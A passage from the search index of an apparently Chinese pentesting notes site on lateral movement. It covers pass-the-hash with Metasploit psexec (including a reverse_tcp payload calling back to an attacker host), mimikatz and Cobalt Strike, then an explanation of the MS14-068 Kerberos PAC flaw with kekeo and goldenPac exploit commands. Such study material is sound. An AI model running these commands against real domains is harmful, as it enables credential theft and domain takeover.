31d6cfe0d16ae931b73c59d7e0c089c0","title":"HASH\u83b7\u53d6."},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#hash-pth-pass-the-hash","text":"1.msf\u91cc\u4f7f\u7528psexec\u6a21\u5757 msf5 exploit(multi/handler) > use exploit/windows/smb/psexec //\u4ee5root\u542f\u52a8msf [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp msf5 exploit(windows/smb/psexec) > set lhsot 192.168.64.133 lhsot => 192.168.64.133 msf5 exploit(windows/smb/psexec) > set lhost 192.168.64.133 lhost => 192.168.64.133 msf5 exploit(windows/smb/psexec) > set lport 443 lport => 443 msf5 exploit(windows/smb/psexec) > set rhost 192.168.52.138 rhost => 192.168.52.138 msf5 exploit(windows/smb/psexec) > set SMBUser Administrator SMBUser => Administrator msf5 exploit(windows/smb/psexec) > set SMBPass 8a963371a63944419ec1adf687bb1be5 //\u4e00\u822c\u9009\u62e9NTLM HASH SMBPass => 8a963371a63944419ec1adf687bb1be5 msf5 exploit(windows/smb/psexec) > run 2.\u4f7f\u7528mimikatz \u6211\u4eec\u5728\u76ee\u6807\u673a\u91cc\u653e\u7f6emimikatz.exe \u7136\u540e\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4 sekurlsa::pth /user:administrator /domain:\"xxx.com\" /ntlm:6542d35ed5ff6ae5e75b875068c5d3bc //\u81ea\u884c\u4fee\u6539 \u4e4b\u540e\u4fbf\u4f1a\u5f39\u51fa\u4e00\u4e2acmd\u7a97\u53e3\uff0c\u5728\u8fd9\u4e2a\u7a97\u53e3\u91cc\u94fe\u63a5\u673a\u5668\u5373\u53ef net use \\\\192.168.222.131\\c$ 3.\u4f7f\u7528cobalt strike \u5728cobalt strike\u91cc\u627e\u5230\u57df\u63a7\uff0c\u7136\u540e\u4f7f\u7528psexec\u6a21\u5757\uff0c\u9009\u62e9\u4e00\u4e2a\u672c\u5730hash\u5373\u53ef\u3002","title":"hash \u4f20\u9012\u653b\u51fb PTH \uff08Pass the Hash)"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#ms14-068","text":"\u8fd9\u4e2a\u6d1e\u7684\u5371\u5bb3\u5f88\u5927\uff0c\u53ef\u4ee5\u8ba9\u4efb\u610f\u57df\u7528\u6237\u63d0\u6743\u5230\u57df\u7ba1\u3002 \u9002\u7528\u7248\u672c: server 2000\u4ee5\u4e0a \u8865\u4e01: kb3011780","title":"MS14-068"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#pac","text":"PAC\u662fkerberos\u534f\u8bae\u91cc\u7528\u6765\u89e3\u51b3\u7528\u6237\u6743\u9650\u529f\u80fd\u6240\u8bbe\u8ba1\u51fa\u7684\u4e1c\u897f\u3002 \u5728kerberos\u534f\u8bae\u91cc\u9762\uff0c\u4e00\u4e2a\u7528\u6237\u7528\u81ea\u5df1\u7684hash\u62ff\u5230\u4e86TGT\uff0c\u63a5\u7740\u51ed\u501f\u7740TGT\u62ff\u5230\u4e86TGS\uff0c\u63a5\u7740\u7528TGS\u53bb\u8bbf\u95ee\u670d\u52a1\u3002\u770b\u4f3c\u53ea\u8981hash\u6b63\u786e\uff0c\u7528\u6237\u5c31\u80fd\u5230\u5904\u8bbf\u95ee\u670d\u52a1\uff0c\u4f46\u662f\u6240\u6709\u670d\u52a1\u90fd\u53ef\u4ee5\u7ed9\u8fd9\u4e2a\u7528\u6237\u6240\u8bbf\u95ee\u5417\uff1f\u80af\u5b9a\u662f\u4e0d\u884c\u7684\uff0c\u6240\u4ee5\u5fae\u8f6f\u5728kerberos\u4e3a\u4e86\u5b9e\u73b0\u7528\u6237\u6743\u9650\u5206\u7ea7\uff0c\u91c7\u7528\u4e86PAC\u3002 PAC\u88ab\u8bbe\u8ba1\u4e3a\u5b58\u5728\u4e8eTGT\u91cc\u9762\u3002\u5b8c\u6574\u7684kerberos\u6743\u9650\u9a8c\u8bc1\u6d41\u7a0b\u5982\u4e0b\u3002 1\u3002\u7528\u6237\u51ed\u501f\u81ea\u5df1\u7684hash\u52a0\u5bc6\u65f6\u95f4\u6233\u5e76\u53d1\u9001\u660e\u6587\u7528\u6237\u540d\u5230KDC\uff0cKDC\u8ba4\u8bc1\u7528\u6237\u6210\u529f\u540e\u8fd4\u56de\u88abkrbtgt\u7528\u6237hash\u52a0\u5bc6\u7684TGT(\u5185\u6709ticekt\u5305\u542b\u7740PAC)\uff0c\u4ee5\u53ca\u7528\u6237\u81ea\u8eabhash\u52a0\u5bc6\u7684login session key 2.\u7528\u6237\u51ed\u501fTGT\u7968\u636e\u5411KDC\u53d1\u8d77\u6307\u5b9a\u670d\u52a1\u7684TGS_REQ\u3002KDC\u7528krbtgt hash\u89e3\u5bc6\uff0c\u82e5\u89e3\u5bc6\u6210\u529f\u5219\u76f4\u63a5\u8fd4\u56de\u670d\u52a1hash\u52a0\u5bc6\u7684TGS\uff08\u8fd9\u91cc\u5e76\u6ca1\u8003\u8651\u7528\u6237\u7684\u6743\u9650\uff0c\u76f4\u63a5\u8fd4\u56de\u4e86TGS\uff09 3.\u7528\u6237\u7528TGS\u5411\u670d\u52a1\u53d1\u8d77\u8bf7\u6c42\uff0c\u670d\u52a1\u7528\u81ea\u5df1\u7684hash\u89e3\u5bc6TGS\u540e\u83b7\u5f97PAC\uff0c\u62ff\u7740PAC\u5411KDC\u8be2\u95ee\u8be5\u7528\u6237\u662f\u5426\u6709\u6743\u9650\u8bbf\u95ee\u3002KDC\u62ff\u5230PAC\u540e\u518d\u6b21\u89e3\u5bc6\uff0c\u5f97\u5230\u4e86PAC\u91cc\u7684 \u7528\u6237\u7684sid\uff0c\u4ee5\u53ca\u6240\u5728\u7684\u7ec4\uff0c\u518d\u5224\u65ad\u7528\u6237\u662f\u5426\u6709\u8bbf\u95ee\u670d\u52a1\u7684\u6743\u9650\uff08\u6709\u4e9b\u670d\u52a1\u4e0d\u4f1a\u9a8c\u8bc1KDC\uff0c\u8fd9\u6837\u5c31\u4f1a\u5bfc\u81f4\u767d\u94f6\u7968\u636e\u653b\u51fb) PAC\u81ea\u8eab\u7684\u7ed3\u6784 PAC\u5728Ticket\u4e2d\u7684\u7ed3\u6784 \u53c8\u8fd9\u4e2a\u56fe\u53ef\u4ee5\u77e5\u9053,PAC\u53ea\u4e0d\u8fc7\u662fticket\u91ccAuthorization DATA\u7684\u4e00\u4e2a\u5206\u652f\u3002 \u800cAuthorization data\u7684\u7ed3\u6784\u662f\u8fd9\u6837\u7684 AuthorizationData ::= SEQUENCE OF SEQUENCE { ad-type [0] Int32, ad-data [1] OCTET STRING } ad-type\u4e2d\u5c31\u6709\u8fd9\u4e48\u4e00\u4e2a\u7c7b\u578b AD-IF-RELEVANT \u5bf9\u5e94\u6570\u5b571,\u7531\u4e0a\u4e0a\u56fe\u53ef\u77e5\u8fd9\u662fPAC\u7684\u5916\u58f3\u3002 \u82e5\u7c7b\u578b\u4e3a AD-IF-RELEVAN ,\u90a3\u4e48ad-data\u4e5f\u662f\u4e00\u4e2a AuthorizationData\u7c7b\u578b\u7684\u7ed3\u6784\u4f53\uff0c\u4e5f\u6709ad-type \u548cad-data.\u90a3\u4e48\u8fd9\u4e2a\u5916\u58f3ad-data\u7684ad-type\u5c31\u662f\u6b21\u5916\u58f3AD-WIN2K-PAC \u4e86,\u4e0e AD-WIN2K-PAC \u8fd9\u4e2aad-type\u5bf9\u5e94\u7684ad-data\u5c31\u662f\u4e00\u6bb5\u8fde\u7eed\u7a7a\u95f4\u3002 \u8fd9\u6bb5\u7a7a\u95f4\u5305\u542b\u4e00\u4e2a\u5934\u90e8PACTYPE\u4ee5\u53ca\u82e5\u5e72\u4e2aPAC_INFO_BUFFER \u3002 PACTYPE\u5305\u542b\u7684\u662f cBuffers,\u7248\u672c\u4ee5\u53ca\u7f13\u51b2\u533a \u3002 PAC_INFO_BUFFER\u662fkey-value\u578b\u7684\u3002PAC_INFO_BUFFER\u7684key\u6709\u5f88\u591a 0x00000001 \u767b\u5f55\u4fe1\u606f\u3002PAC\u7ed3\u6784\u5fc5\u987b\u5305\u542b\u4e00\u4e2a\u8fd9\u79cd\u7c7b\u578b\u7684\u7f13\u51b2\u533a\u3002\u5176\u4ed6\u767b\u5f55\u4fe1\u606f\u7f13\u51b2\u533a\u5fc5\u987b\u88ab\u5ffd\u7565\u3002 0x00000002 \u51ed\u8bc1\u4fe1\u606f\u3002PAC\u7ed3\u6784\u4e0d\u5e94\u5305\u542b\u591a\u4e2a\u6b64\u7c7b\u7f13\u51b2\u533a\u3002\u7b2c\u4e8c\u6216\u540e\u7eed\u51ed\u8bc1\u4fe1\u606f\u7f13\u51b2\u533a\u5728\u63a5\u6536\u65f6\u5fc5\u987b\u88ab\u5ffd\u7565\u3002 0x00000006 \u670d\u52a1\u5668\u6821\u9a8c\u548c\u3002PAC\u7ed3\u6784\u5fc5\u987b\u5305\u542b\u4e00\u4e2a\u8fd9\u79cd\u7c7b\u578b\u7684\u7f13\u51b2\u533a\u3002\u5176\u4ed6\u767b\u5f55\u670d\u52a1\u5668\u6821\u9a8c\u548c\u7f13\u51b2\u533a\u5fc5\u987b\u88ab\u5ffd\u7565\u3002 0x00000007 KDC\uff08\u7279\u6743\u670d\u52a1\u5668\uff09\u6821\u9a8c\u548c\uff08\u7b2c2.8\u8282\uff09\u3002PAC\u7ed3\u6784\u5fc5\u987b\u5305\u542b\u4e00\u4e2a\u8fd9\u79cd\u7c7b\u578b\u7684\u7f13\u51b2\u533a\u3002\u9644\u52a0\u7684KDC\u6821\u9a8c\u548c\u7f13\u51b2\u533a\u5fc5\u987b\u88ab\u5ffd\u7565\u3002 0x0000000A \u5ba2\u6237\u540d\u79f0\u548c\u7968\u8bc1\u4fe1\u606f\u3002PAC\u7ed3\u6784\u5fc5\u987b\u5305\u542b\u4e00\u4e2a\u8fd9\u79cd\u7c7b\u578b\u7684\u7f13\u51b2\u533a\u3002\u9644\u52a0\u7684\u5ba2\u6237\u548c\u7968\u636e\u4fe1\u606f\u7f13\u51b2\u533a\u5fc5\u987b\u88ab\u5ffd\u7565\u3002 0x0000000B \u53d7\u7ea6\u675f\u7684\u59d4\u6d3e\u4fe1\u606f\u3002PAC\u7ed3\u6784\u5fc5\u987b\u5305\u542b\u4e00\u4e2aS4U2proxy\u8bf7\u6c42\u7684\u6b64\u7c7b\u7f13\u51b2\u533a\uff0c\u5426\u5219\u4e0d\u5305\u542b\u3002\u9644\u52a0\u7684\u53d7\u7ea6\u675f\u7684\u59d4\u6258\u4fe1\u606f\u7f13\u51b2\u533a\u5fc5\u987b\u88ab\u5ffd\u7565\u3002 0x0000000C \u7528\u6237\u4e3b\u4f53\u540d\u79f0\uff08UPN\uff09\u548c\u57df\u540d\u7cfb\u7edf\uff08DNS\uff09\u4fe1\u606f\u3002PAC\u7ed3\u6784\u4e0d\u5e94\u5305\u542b\u591a\u4e2a\u8fd9\u79cd\u7c7b\u578b\u7684\u7f13\u51b2\u533a\u3002\u63a5\u6536\u65f6\u5fc5\u987b\u5ffd\u7565\u7b2c\u4e8c\u4e2a\u6216\u540e\u7eed\u7684UPN\u548cDNS\u4fe1\u606f\u7f13\u51b2\u533a\u3002 0x0000000D \u5ba2\u6237\u7d22\u53d6\u4fe1\u606f\u3002PAC\u7ed3\u6784\u4e0d\u5e94\u5305\u542b\u591a\u4e2a\u8fd9\u79cd\u7c7b\u578b\u7684\u7f13\u51b2\u533a\u3002\u9644\u52a0\u7684\u5ba2\u6237\u8981\u6c42\u4fe1\u606f\u7f13\u51b2\u533a\u5fc5\u987b\u88ab\u5ffd\u7565\u3002 0x0000000E \u8bbe\u5907\u4fe1\u606f\u3002PAC\u7ed3\u6784\u4e0d\u5e94\u5305\u542b\u591a\u4e2a\u8fd9\u79cd\u7c7b\u578b\u7684\u7f13\u51b2\u533a\u3002\u9644\u52a0\u7684\u8bbe\u5907\u4fe1\u606f\u7f13\u51b2\u533a\u5fc5\u987b\u88ab\u5ffd\u7565\u3002 0x0000000F \u8bbe\u5907\u58f0\u660e\u4fe1\u606f\u3002PAC\u7ed3\u6784\u4e0d\u5e94\u5305\u542b\u591a\u4e2a\u8fd9\u79cd\u7c7b\u578b\u7684\u7f13\u51b2\u533a\u3002\u9644\u52a0\u7684\u8bbe\u5907\u58f0\u660e\u4fe1\u606f\u7f13\u51b2\u533a\u5fc5\u987b\u88ab\u5ffd\u7565\u3002 \u5176\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u662f1,6\u548c7 0x00000001 KERBVALIDATIONINFO \u8fd9\u4e2a\u7ed3\u6784\u7528\u4e8e\u5b58\u50a8\u7528\u6237\u7684\u8eab\u4efd\u4fe1\u606f.\u5b83\u662f\u4e00\u4e2a\u7ed3\u6784\u4f53\uff0c\u8fd9\u4e2a\u7ed3\u6784\u4f53\u662f\u8fd9\u6837\u7684(\u5f85\u4f1a\u6211\u4eec\u4f2a\u9020PAC\u7684\u65f6\u5019\u4e3b\u8981\u5c31\u662f\u4f2a\u9020\u6b64\u5904\u989d UserId \u4ee5\u53ca PGROUP_MEMBERSHIP GroupIds \uff09\u670d\u52a1\u5668\u89e3\u5305PAC\u540e\u63d0\u53d6\u7528\u6237\u7684sid\u4ee5\u53cagroupid\uff0c\u7136\u540e\u5c31\u628a\u5f53\u524d\u53d1\u5305\u8fc7\u6765\u7684\u7528\u6237\u6743\u9650\u5f53\u6210sid\uff0cgroupid\u7684\u6743\u9650\u5904\u7406\u3002 typedef struct _KERB_VALIDATION_INFO { FILETIME LogonTime; FILETIME LogoffTime; FILETIME KickOffTime; FILETIME PasswordLastSet; FILETIME PasswordCanChange; FILETIME PasswordMustChange; RPC_UNICODE_STRING EffectiveName; RPC_UNICODE_STRING FullName; RPC_UNICODE_STRING LogonScript; RPC_UNICODE_STRING ProfilePath; RPC_UNICODE_STRING HomeDirectory; RPC_UNICODE_STRING HomeDirectoryDrive; USHORT LogonCount; USHORT BadPasswordCount; ULONG UserId; //\u7528\u6237\u7684sid ULONG PrimaryGroupId; ULONG GroupCount; [size_is(GroupCount)] PGROUP_MEMBERSHIP GroupIds;//\u7528\u6237\u6240\u5728\u7684\u7ec4\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u7be1\u6539\u7684\u8fd9\u4e2a\u7684\u8bdd\uff0c\u6dfb\u52a0\u4e00\u4e2a500(\u57df\u7ba1\u7ec4)\uff0c\u90a3\u7528\u6237\u5c31\u662f\u57df\u7ba1\u4e86\u3002\u5728ms14068 PAC\u7b7e\u540d\u88ab\u7ed5\u8fc7\uff0c\u7528\u6237\u53ef\u4ee5\u81ea\u5df1\u5236\u4f5cPAC\u7684\u60c5\u51b5\u5e95\u4e0b\uff0cpykek\u5c31\u662f\u9760\u5411\u8fd9\u4e2a\u5730\u65b9\u5199\u8fdb\u57df\u7ba1\u7ec4\uff0c\u6210\u4e3a\u4f7f\u5f97\u6539\u7528\u6237\u53d8\u6210\u57df\u7ba1 ULONG UserFlags; USER_SESSION_KEY UserSessionKey; RPC_UNICODE_STRING LogonServer; RPC_UNICODE_STRING LogonDomainName; PISID LogonDomainId; ULONG Reserved1[2]; ULONG UserAccountControl; ULONG SubAuthStatus; FILETIME LastSuccessfulILogon; FILETIME LastFailedILogon; ULONG FailedILogonCount; ULONG Reserved3; ULONG SidCount; [size_is(SidCount)] PKERB_SID_AND_ATTRIBUTES ExtraSids; PISID ResourceGroupDomainSid; ULONG ResourceGroupCount; [size_is(ResourceGroupCount)] PGROUP_MEMBERSHIP ResourceGroupIds; } KERB_VALIDATION_INFO; 0x00000006\u548c0x00000007 6\u662f\u670d\u52a1\u5668\u6821\u9a8c\u548c\uff0c\u7531server\u5bc6\u7801\u52a0\u5bc6\u30027\u662fKDC\u6821\u9a8c\u548c\uff0c\u53c8KDC\u5bc6\u7801\u52a0\u5bc6\u3002\u5b58\u5728\u7684\u76ee\u7684\u5c31\u662f\u9632\u6b62PAC\u88ab\u7be1\u6539\u3002","title":"PAC"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#ms14068","text":"\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u4ea7\u751f\u4e3b\u8981\u662f\u5fae\u8f6f\u72af\u4e0b\u4e86\u4e09\u4e2a\u9519\u8bef\uff1a 1.\u5bf9\u6821\u9a8c\u548c\u7684\u7b97\u6cd5\u5b9e\u73b0\u4e0d\u591f\u7ec6\u81f4\uff0c\u5bfc\u81f4\u5728\u6821\u9a8c\u548c\u751f\u6210\u65f6\u53ef\u4ee5\u4e0d\u7528\u7ba1server\u548cKDC\u7684hash\u76f4\u63a5\u751f\u6210\uff0c\u800c\u4e14\u751f\u6210\u51fa\u6765\u7684\u6821\u9a8c\u548c\u8fd8\u662f\u5408\u6cd5\u7684 2.PAC\u53ef\u4ee5\u4e0d\u7528\u653e\u5728TGT\u4e2d\uff0c\u5373\u4f7f\u662f\u8fd9\u6837\uff0cKDC\u4e5f\u80fd\u7167\u5e38\u89e3\u6790\u51faTGT\u5916\u7684PAC 3.\u4e0b\u9762\u518d\u8bf4 \u90a3\u4e48\u8fd9\u4e2a\u6f0f\u6d1e\u5927\u81f4\u7684\u653b\u51fb\u539f\u7406\u662f\u4ec0\u4e48\u5462\u3002 \u9996\u5148\uff0c\u6211\u4eec\u5728as_request\u7684\u65f6\u5019\uff0c\u628ainclude-PAC\u6807\u5fd7\u8bbe\u7f6e\u4e3afalse\uff0c\u90a3\u4e48as_rep\u5c31\u4e0d\u4f1a\u5728TGT\u4e2d\u8fd4\u56dePAC\u4e86\u3002\u7136\u540e\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u81ea\u5df1\u4f2a\u9020\u4e00\u4e2apac\uff0c\u5728TGS_REQ\u65f6\u53d1\u8fc7\u53bb\u5c31\u884c\u4e86\u3002\u4f2a\u9020\u7684pac\u4fee\u6539USER SID\\&GROUP SID(\u5728PAC\u7684 0x00000001 KERBVALIDATIONINFO \u7ed3\u6784)\u53ef\u4ee5\u628a\u6211\u4eec\u7684\u7528\u6237\u6743\u9650\u6539\u5230\u5f88\u9ad8\uff08\u57df\u7ba1\uff09\uff0c\u4ece\u800c\u8fbe\u5230\u63d0\u6743\u5230\u57df\u7ba1\u7684\u80fd\u529b\u3002 \u90a3\u4e48\u4f2a\u9020PAC\uff0c\u6211\u4eec\u5c31\u9047\u5230\u4e86\u4e24\u4e2a\u95ee\u9898\uff1a 1.pac\u91cc\u6709\u6821\u9a8c\u548c\uff0c\u9632\u6b62\u81ea\u5df1\u88ab\u7be1\u6539\uff0c\u6211\u4eec\u5f97\u6709server\u548cKDC\u5bc6\u7801\u624d\u80fd\u4f7f\u6821\u9a8c\u548c\u5408\u6cd5\u3002 2.pac\u6309\u7406\u8bf4\u5e94\u8be5\u5728TGT\u91cc\uff0c\u4f46\u662fTGT\u662f\u88abkbrtgt hash\u52a0\u5bc6\u7684\uff0c\u6211\u4eec\u65e0\u6cd5\u83b7\u53d6kbrtgt hash\u7ee7\u800c\u65e0\u6cd5\u4fee\u6539TGT\u5185\u5bb9\uff0c\u7ee7\u800c\u4e0d\u80fd\u4fee\u6539PAC\u3002 \u6765\u8bf4\u8bf4\u5982\u4f55\u7ed5\u8fc7PAC\u6821\u9a8c\u548c\u95ee\u9898\u3002 \u6211\u4eec\u521a\u521a\u8bf4\u8fc7\uff0c 0x00000006\u548c0x00000007 \u8fd9\u4e24\u4e2a\u7ed3\u6784\u7684\u5b58\u5728\u662f\u4e3a\u4e86\u9632\u6b62PAC\u88ab\u7be1\u6539\uff0c\u8fd9\u4e2a\u6821\u9a8c\u548c\u7b97\u6cd5\u91c7\u7528\u7684\u662f\u4e2a\u53ebchecksum\u7b97\u6cd5\u7136\u540e\u628akdc hash\u548c\u670d\u52a1hash\u5f53\u4f5ckey\u5bf9PAC\u52a0\u5bc6\u4ea7\u751f\u7684\u503c\uff0c\u4ece\u800c\u9632\u6b62PAC\u88ab\u7be1\u6539\u3002\u4f46\u662fchecksum\u7b97\u6cd5\u662f\u6709\u5f88\u591a\u79cd\u7684\uff0cmd5\u4e5f\u662fchecksum\u7684\u5206\u652f\u4e4b\u4e00\uff0c\u4fee\u6539PAC\u540e\uff0c\u6211\u4eec\u53ea\u9700\u8bbe\u7f6e\u52a0\u5bc6\u7b97\u6cd5\u4e3aMD5\u5e76\u7528MD5\u7b97\u6cd5\u5bf9 0x00000001 KERBVALIDATIONINFO \u8fdb\u884c\u52a0\u5bc6\uff0c\u5c06\u751f\u6210\u7684\u503c\u653e\u5165\u4e24\u4e2a\u68c0\u9a8c\u548c\u5373\u53ef\uff0cKDC\u62ff\u5230 0x00000001 KERBVALIDATIONINFO \uff0c\u5e76\u4e14\u901a\u8fc7\u89e3\u6790\u6570\u636e\u5305\u83b7\u53d6\u5f53\u524d\u52a0\u5bc6\u7b97\u6cd5\u4e3aMD5\uff0c\u7136\u540e\u5bf9\u5176\u8fdb\u884cMD5\u52a0\u5bc6\uff0c\u82e5\u52a0\u5bc6\u7ed3\u679c\u4e0e\u6821\u9a8c\u548c\u4e00\u81f4\uff0c\u5219\u8ba4\u4e3aPAC\u672a\u88ab\u4fee\u6539 \u518d\u6765\u8bf4\u8bf4\u5982\u4f55\u7ed5\u8fc7krbtgt hash\u52a0\u5bc6TGT\u7684\u95ee\u9898\u3002 \u56e0\u4e3a\u6211\u4eec\u5728AS_REQ\u65f6\u8bbe\u7f6einclude-PAC\u4e3afalse\uff0cTGT\u91cc\u5c31\u4e0d\u4f1a\u5305\u542bPAC\u4e86\u3002\u90a3\u4e48\u6211\u4eec\u5728TGS_REQ\u65f6\u5982\u4f55\u628aPAC\u4f20\u9012\u7ed9KDC\uff1f\u53ea\u9700\u8981\u628aPAC\u653e\u5165req-body\u5373\u53ef\u3002 \u8fd9\u6837KDC\u4f9d\u65e7\u4f1a\u6b63\u5e38\u89e3\u6790\u8fd9\u4e2aTGS_REQ\u5305 \u6ce8\u610fTGS_REQ\u91cc\u7684include-pac\u4f9d\u65e7\u662ffalse\u3002 \u7136\u540eKDC\u63a5\u6536\u5230PAC\u540e\u4f1a\u5148\u89e3\u5bc6TGT\u62ff\u5230authenticator\u91cc\u7684key\u5bf9PAC\u8fdb\u884c\u89e3\u5bc6\uff08TGS_REQ\u65f6\u52a0\u5bc6PAC\u7528\u7684key\u662f\u968f\u673a\u751f\u6210\u7684\uff0c\u8fd9\u4e2akey\u4f1a\u653e\u5728authenticator\u91cc\uff09\uff0c\u7136\u540e\u9a8c\u8bc1\u4e00\u4e0bPAC\u7684\u7b7e\u540d\uff0c\u82e5\u6210\u529f\u7136\u540e\u628a\u89e3\u5bc6\u5f97\u5230\u7684PAC\u91c7\u7528server key\u548cKDC key\u91cd\u65b0\u751f\u6210\u6821\u9a8c\u548c\uff0c\u62fc\u63a5\u6210\u4e00\u4e2a\u65b0\u7684TGT\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u3002 \u4e0a\u9762\u8fd9\u4e00\u6bb5\u5c31\u662f\u5fae\u8f6f\u72af\u4e0b\u7684\u7b2c\u4e09\u4e2a\u9519\u8bef\uff0c\u5f88\u4e0d\u53ef\u601d\u8bae\uff0c\u5c45\u7136\u83ab\u540d\u5176\u5999\u7684\u8fd4\u56de\u4e86\u4e00\u4e2a\u5305\u542b\u4e86PAC\u7684TGT\u56de\u6765\u3002\u603b\u7ed3\u6765\u8bf4\u5c31\u662f\u6784\u9020\u4e86\u4e00\u4e2a\u7578\u5f62\u7684TGS_REQ\uff0c\u4eceTGS_RES\u5f97\u5230\u4e86\u4e00\u4e2a\u5305\u542b\u4f2a\u9020PAC\u7684TGT\u3002 \u539f\u7406\u5c31\u662f\u4e0a\u9762\u8fd9\u4e9b\uff0c\u7136\u540e\u6211\u4eec\u7528\u5305\u542b\u4f2a\u9020PAC\u7684TGT\u5230\u5904\u8bbf\u95ee\u670d\u52a1\u5373\u53ef\u3002","title":"MS14068"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#m14068","text":"1.\u5de5\u5177kekeo https://github.com/gentilkiwi/kekeo/releases/tag/2.2.0-20200718 \u5177\u4f53\u65b9\u6cd5\u4e3a\uff0c\u5728kekeo\u91cc\u5148\u6267\u884c kerberos::purge\u6e05\u7a7a\u7968\u636e \u7136\u540e\u518d\u6267\u884c exploit::ms14068 /user:xxx /password:xxx /domain:xxx /ptt \u5373\u53ef\u3002 \u7136\u540e\u5c31dir \\\u57df\u63a7\\c\\$ \u8bd5\u8bd5\uff0c\u5982\u679c\u53ef\u4ee5\u5c31\u8bf4\u660e\u63d0\u6743\u6210\u529f\u4e86\uff08\u4e0d\u662f\u6bcf\u6b21\u90fd\u80fd\u6210\u529f\u7684) 2.golenpac https://github.com/maaaaz/impacket-examples-windows/blob/master/goldenPac.exe \u8fd9\u4e2a\u5de5\u5177\u597d\u7528, \u6267\u884c\u7c7b\u4f3c\u4e0a\u8ff0\u547d\u4ee4\uff0c\u5c31\u80fd\u8fd4\u56de\u4e00\u4e2a\u57df\u63a7\u7684 system\u6743\u9650\u7684cmd shell\u56de\u6765\uff0c\u611f\u89c9\u86ee\u597d\u7528 \u53e6\u5916\u5728\u6700\u540e\u6307\u5b9a\u57df\u63a7\u673a\u5668\u65f6\uff0c\u53ef\u4ee5\u6307\u5b9a\u57df\u63a7\u4ee5\u5916\u7684\u673a\u5668\u5e76\u83b7\u53d6\u4ed6\u4eec\u7684\u672c\u5730system\u6743\u9650\u7528\u6237. \u4f46\u8fd4\u56de\u7684\u4f3c\u4e4e\u4e0d\u662f\u57df\u63a7\uff1f","title":"M14068\u5229\u7528"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#kerberoast","text":"Kerberoast\u653b\u51fb\u539f\u7406: \u653b\u51fb\u8005\u4ece TGS-REP \u4e2d\u63d0\u53d6\u52a0\u5bc6\u7684\u670d\u52a1\u7968\u8bc1\u3002 \u7531\u4e8e\u670d\u52a1\u7968\u8bc1\u662f\u7528\u94fe\u63a5\u5230\u8bf7\u6c42 SPN 